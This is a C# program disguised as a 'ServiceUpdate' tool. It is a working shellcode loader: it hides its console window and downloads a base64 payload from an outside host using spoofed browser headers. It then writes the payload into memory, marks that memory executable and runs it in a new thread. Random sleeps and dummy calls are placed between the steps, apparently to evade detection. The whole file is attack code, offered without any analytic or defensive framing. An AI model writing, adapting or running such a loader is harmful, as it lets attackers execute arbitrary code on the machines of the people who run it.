using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace ServiceUpdate
{
    class Update
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            UInt32 size,
            UInt32 flAllocationType,
            UInt32 flProtect
        );

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            UInt32 dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
        );

        [DllImport("kernel32.dll")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(
            IntPtr lpAddress,
            UInt32 dwSize,
            UInt32 flNewProtect,
            out UInt32 lpflOldProtect
        );

        const int SW_HIDE = 0;

        static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            string updateUrl = "http://super-legit-website.com/api/v2/service-pack-1.dat";
            byte[] service;

            using (WebClient client = new WebClient())
            {
                client.Headers.Add(
                    "User-Agent",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
                );
                client.Headers.Add("Accept", "application/octet-stream");
                client.Headers.Add("Accept-Encoding", "gzip, deflate");
                client.Headers.Add("Accept-Language", "en-US,en;q=0.9");
                client.Headers.Add(
                    "Referer",
                    "https://www.contoso.com/support/downloads/latest-updates"
                );

                string updateBase64 = client.DownloadString(updateUrl);
                service = Convert.FromBase64String(updateBase64);
            }

            RandomSleep();
            ExecuteRandomFunction();

            UInt32 MEM_COMMIT = 0x1000;
            UInt32 PAGE_READWRITE = 0x04;
            UInt32 PAGE_EXECUTE_READ = 0x20;

            IntPtr funcAddr = VirtualAlloc(
                IntPtr.Zero,
                (UInt32)service.Length,
                MEM_COMMIT,
                PAGE_READWRITE
            );

            RandomSleep();
            ExecuteRandomFunction();

            Marshal.Copy(service, 0, funcAddr, service.Length);

            RandomSleep();
            ExecuteRandomFunction();

            UInt32 oldProtect;
            VirtualProtect(funcAddr, (UInt32)service.Length, PAGE_EXECUTE_READ, out oldProtect);

            RandomSleep();
            ExecuteRandomFunction();

            UInt32 threadId = 0;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        static void RandomSleep()
        {
            Random rnd = new Random();
            int sleepInterval = rnd.Next(1000, 5000);
            Thread.Sleep(sleepInterval);
        }

        static void ExecuteRandomFunction()
        {
            Random rnd = new Random();
            int functionIndex = rnd.Next(1, 5);

            switch (functionIndex)
            {
                case 1:
                    GetProcessId();
                    break;
                case 2:
                    GetSystemTime();
                    break;
                case 3:
                    GetTickCount();
                    break;
                case 4:
                    GetEnvironmentVariable();
                    break;
            }
        }

        static void GetProcessId()
        {
            int processId = Process.GetCurrentProcess().Id;
        }

        static void GetSystemTime()
        {
            DateTime systemTime = DateTime.Now;
        }

        static void GetTickCount()
        {
            int tickCount = Environment.TickCount;
        }

        static void GetEnvironmentVariable()
        {
            string userProfile = Environment.GetEnvironmentVariable("USERPROFILE");
        }
    }
}
